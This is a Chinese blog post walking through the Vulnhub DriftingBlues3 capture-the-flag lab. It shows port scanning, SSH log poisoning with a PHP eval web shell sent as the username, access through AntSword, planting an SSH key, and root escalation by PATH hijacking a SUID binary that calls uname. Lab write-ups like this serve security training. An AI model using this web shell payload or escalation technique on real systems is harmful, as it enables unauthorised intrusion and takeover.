@@ -1,0 +1,195 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Vulnhub系列-Draftingblues3 | Aesm1p&#39;s Blog | 前方如聂鲁达的爱情诗一般美好</title>
+
+  
+  <meta name="author" content="Aesm1p">
+  
+
+  
+  <meta name="description" content="相逢意气为君饮">
+  
+
+  
+  
+  <meta name="keywords" content="suid提权">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Vulnhub系列-Draftingblues3"/>
+
+  <meta property="og:site_name" content="Aesm1p&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Aesm1p&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Aesm1p&#39;s Blog</a>
+    </h1>
+    <p class="site-description">前方如聂鲁达的爱情诗一般美好</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">HOME</a></li>
+      
+        <li><a href="/archives">ARCHIVES</a></li>
+      
+        <li><a href="/tags">TAGS</a></li>
+      
+        <li><a href="/about">ABOUT</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Vulnhub系列-Draftingblues3</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/06/03/vulnhubDraftingblues3/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-06-03T12:23:22.000Z">
+          2021-06-03
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><img src="/2021/06/03/vulnhubDraftingblues3/2.png" alt></p>
+<a id="more"></a>
+<p>扫描端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sT -sV -A -oA nmap -vv 192.168.56.110</span><br></pre></td></tr></table></figure>
+<p>开放80和22端口</p>
+<p>80端口访问robots.txt可以得到路径提示，访问<code>/eventadmins</code>路径，得到提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">man there&#39;s a problem with ssh</span><br><span class="line"></span><br><span class="line">john said &quot;it&#39;s poisonous!!! stay away!!!&quot;</span><br><span class="line"></span><br><span class="line">idk if he&#39;s mentally challenged</span><br><span class="line"></span><br><span class="line">please find and fix it</span><br><span class="line"></span><br><span class="line">also check &#x2F;littlequeenofspades.html</span><br><span class="line"></span><br><span class="line">your buddy, buddyG</span><br></pre></td></tr></table></figure>
+<p>可以看到还有一个页面<code>/littlequeenofspades.html</code>，访问该页面，然后此时需要开脑洞查看一下源代码，可以看到一段base64</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;draftingblue3]</span><br><span class="line">└─$ echo &#39;aW50cnVkZXI&#x2F;IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ&#x3D;&#x3D;&#39;|base64 -d</span><br><span class="line">intruder? L2FkbWluc2ZpeGl0LnBocA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~&#x2F;draftingblue3]</span><br><span class="line">└─$ echo &#39;L2FkbWluc2ZpeGl0LnBocA&#x3D;&#x3D;&#39;|base64 -d</span><br><span class="line">&#x2F;adminsfixit.php</span><br></pre></td></tr></table></figure>
+<p>访问/adminsfixit.php页面，该页面会记录登录记录，所以我们可以通过登录名来构造php木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#39;&lt;?php @eval($_POST[123]);?&gt;&#39;@192.168.56.110</span><br></pre></td></tr></table></figure>
+<p>然后蚁剑连接即可，发现robertj用户.ssh非属主用户可读可写可执行，所以上传公钥到服务器然后即可登录</p>
+<p><img src="/2021/06/03/vulnhubDraftingblues3/1.png" alt></p>
+<p>登录之后查看user.txt可以得到第一段flag</p>
+<p>查看id可以发现该用户存在一个奇怪的用户组operators</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">robertj@driftingblues:&#x2F;tmp$ id</span><br><span class="line">uid&#x3D;1000(robertj) gid&#x3D;1000(robertj) groups&#x3D;1000(robertj),1001(operators)</span><br><span class="line">robertj@driftingblues:&#x2F;tmp$ ls -l &#x2F;usr&#x2F;bin&#x2F;getinfo</span><br><span class="line">-r-sr-s--- 1 root operators 16704 Jan  4 11:05 &#x2F;usr&#x2F;bin&#x2F;getinfo</span><br></pre></td></tr></table></figure>
+<p>查看属于该用户组的suid权限的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robertj@driftingblues:&#x2F;tmp$ find &#x2F; -group operators -perm &#x2F;4000 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;getinfo</span><br></pre></td></tr></table></figure>
+<p>运行该命令，发现得到的是一些服务器的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">robertj@driftingblues:&#x2F;tmp$ getinfo</span><br><span class="line">###################</span><br><span class="line">ip address</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link&#x2F;loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1&#x2F;8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1&#x2F;128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="line">    link&#x2F;ether 08:00:27:d6:e5:24 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.56.110&#x2F;24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="line">       valid_lft 561sec preferred_lft 561sec</span><br><span class="line"></span><br><span class="line">bash</span><br><span class="line">    inet6 fe80::a00:27ff:fed6:e524&#x2F;64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">###################</span><br><span class="line">hosts</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       driftingblues</span><br><span class="line"></span><br><span class="line">bash</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">###################</span><br><span class="line">os info</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
+<p>应该是调用了一些linux命令然后输出，查看最后一行可以猜测是运行了uname命令，尝试查看改文件也能够看出一些蛛丝马迹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ip address</span><br><span class="line">###################</span><br><span class="line">ip a###################</span><br><span class="line">hosts</span><br><span class="line">###################</span><br><span class="line">cat &#x2F;etc&#x2F;hosts###################</span><br><span class="line">os info</span><br><span class="line">##################</span><br><span class="line"> uname -a8\�������������T�����</span><br></pre></td></tr></table></figure>
+<p>知道其实是调用了uname命令的话，那么我们可以通过覆盖系统命令路径到我们自己编写命令那么就可以实现提权，在/tmp目录下新建uname文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br></pre></td></tr></table></figure>
+<p>然后修改path变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br></pre></td></tr></table></figure>
+<p>然后执行getinfo即可实现提权</p>
+<p>之前在监控进程时发现一个upit程序，查看计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@driftingblues:~# crontab -l</span><br><span class="line"># For more information see the manual pages of crontab(5) and cron(8)</span><br><span class="line">#</span><br><span class="line"># m h  dom mon dow   command</span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">* * * * * bash &#x2F;root&#x2F;upit</span><br></pre></td></tr></table></figure>
+<p>可以看到果然存在一个upit的计划任务</p>
+<p>将getinfo文件进行反编译查看一下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  puts(&quot;###################\nip address\n###################\n&quot;);</span><br><span class="line">  system(&quot;ip a&quot;);</span><br><span class="line">  puts(&quot;###################\nhosts\n###################\n&quot;);</span><br><span class="line">  system(&quot;cat &#x2F;etc&#x2F;hosts&quot;);</span><br><span class="line">  puts(&quot;###################\nos info\n###################\n&quot;);</span><br><span class="line">  system(&quot;uname -a&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>完结撒花~</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/vulnhub/">vulnhub</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/suid提权/">suid提权</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Aesm1p
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
